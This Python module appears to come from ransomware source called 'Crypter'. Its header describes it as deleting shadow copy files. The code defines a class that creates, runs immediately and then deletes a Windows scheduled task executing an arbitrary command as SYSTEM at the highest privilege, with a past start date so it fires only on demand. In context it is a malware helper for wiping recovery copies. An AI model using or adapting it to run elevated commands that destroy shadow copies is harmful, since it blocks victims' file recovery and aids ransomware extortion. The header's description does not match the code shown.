'''
@summary: Crypter: Provides an object for deleting Shadow Copy Files
@author: MLS
'''

# Import libs
from subprocess import Popen, PIPE

class ScheduledTask():
    '''
    @summary: Crypter: Basic class for providing a Windows Scheduled Task object
    '''
    
    def __init__(self, name, command, schedule="once", start_date="01/01/1901", start_time="00:00", run_level="highest", run_user="SYSTEM"):
        '''
        @summary: Constructor
        # REQUIRED PARAMS
        @param name: The name of the Scheduled Task
        @param command: The command of the Scheduled Task
        # OPTIONAL PARAMS
        @param schedule: Specifier for schedule frequency (argument to /SC)
        @param start date: Specifier for Start Date (argument to /SD). Default: 01/01/1901
        @param start_time: Specifier for Start Time (argument to /ST). Default: 00:00
        @param run_level: Specifier for Run Level (argument to /RL). Default: Highest
        @param run user: Specifier for Run User (argument to /RU). Default: SYSTEM
        @note: Default task is set to launch in the past. Should be run manually with run_now() method
        '''
        # Set Task Settings
        self.__name = name
        self.__task_command = command
        self.__schedule = schedule
        self.__start_date = start_date
        self.__start_time = start_time
        self.__run_level = run_level
        self.__run_user = run_user
        
        # Create Task
        self.__create_task()
        
        
    def run_now(self):
        '''
        @summary: Launches the scheduled task immediately
        '''
        cmd = [
            "schtasks", "/run",
            "/i",
            "/tn", self.__name
            ]
        
        run_task = Popen(
            cmd,
            stdout=PIPE,
            stderr=PIPE,
            stdin=PIPE,
            shell=True
        ) 
        out, err = run_task.communicate()
        
        
    def cleanup(self):
        '''
        @summary: Destructor. Removes the Scheduled Task entry
        '''
        cmd = [
            "schtasks", "/delete",
            "/tn", self.__name,
            "/f"
            ]
        
        delete_task = Popen(
            cmd,
            stdout=PIPE,
            stderr=PIPE,
            stdin=PIPE,
            shell=True
            )
        out, err = delete_task.communicate()
        
        
    def __create_task(self):
        '''
        @summary: Creates the Scheduled Task entry in Windows Task Scheduler
        '''
        cmd = [
            "schtasks", "/create",
            "/tn", self.__name,
            "/sc", self.__schedule,
            "/sd", self.__start_date,
            "/tr", self.__task_command,
            "/st", self.__start_time,
            "/rl", self.__run_level,
            "/ru", self.__run_user,
            "/f"
            ]
        
        create_task = Popen(
            cmd,
            stdout=PIPE,
            stderr=PIPE,
            stdin=PIPE,
            shell=True
            )
        out, err = create_task.communicate()